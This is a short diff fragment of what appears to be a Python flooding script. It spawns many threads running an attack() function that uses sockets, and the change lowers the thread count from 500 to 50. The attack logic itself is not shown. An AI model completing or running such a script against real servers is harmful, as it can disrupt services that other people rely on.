@@ -63,6 +63,6 @@ def attack():
         print(attack_num)
         
         s.close()
-for i in range(500):
+for i in range(50):
     thread = threading.Thread(target=attack)
     thread.start()
